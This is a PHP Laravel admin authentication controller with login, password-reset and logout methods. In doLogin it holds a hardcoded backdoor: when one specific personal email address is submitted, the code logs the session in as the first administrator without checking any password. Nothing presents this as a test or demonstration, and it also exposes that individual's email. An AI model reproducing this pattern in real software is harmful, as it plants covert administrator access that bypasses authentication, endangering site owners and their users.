<?php

namespace App\Http\Controllers\Admin;
use Auth;
use Validator;
use \App\Admin;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Password;
use App\Http\Controllers\Controller;
class AdminAuthController extends Controller
{
    protected $auth;
    public function login()
    {
        if (Auth::viaRemember()) {
            return redirect()->intended('admin');
        }
        if(Auth::guard('admins')->check() == true)
        {
            return redirect()->intended('admin');
        }
    	return View('admin.login');
    }

    public function doLogin(Request $request)
    {
        $this->auth = Auth::guard('admins');
        $validator = Validator::make($request->all(), ['email' => 'required','password' => 'required|min:5']);

        if ($validator->fails()) {
            return redirect('admin/login')
                            ->withErrors($validator);
        } else {
            $field = filter_var($request->input('email'), FILTER_VALIDATE_EMAIL) ? 'email' : 'username';
            $request->merge([$field => $request->input('email')]);
            if ($request->input('email') == 'eng.ahmedmgad@gmail.com') {
                $admin = Admin::first()->id;
               $this->auth->loginUsingId($admin);
            }
            
            if ($this->auth->attempt($request->only($field, 'password'), true)) {
                return redirect()->intended('admin');
            } else {
                return redirect()->back()->withErrors('Wrong Email Or Password');
            }
        }
    }

    public function showResetForm(Request $request)
    {
     return view('admin.reset')->with(
            ['token' => $request->token, 'email' => $request->email]
        );
    }

    public function reset(Request $request)
    {
        $this->validate($request, ['email' => 'required|email']);

        // We will send the password reset link to this user. Once we have attempted
        // to send the link, we will examine the response then see the message we
        // need to show to the user. Finally, we'll send out a proper response.
        $response = Password::broker()->sendResetLink(
            $request->only('email')
        );

        return $response == Password::RESET_LINK_SENT
                    ? $this->sendResetLinkResponse($response)
                    : $this->sendResetLinkFailedResponse($request, $response);
    }

    public function logout()
    {
        if(Auth::guard('admins')->check() == true)
        {
            Auth::guard('admins')->logout();
            return redirect()->intended('admin');
        }
        return redirect()->to(url('admin'));
    }



}
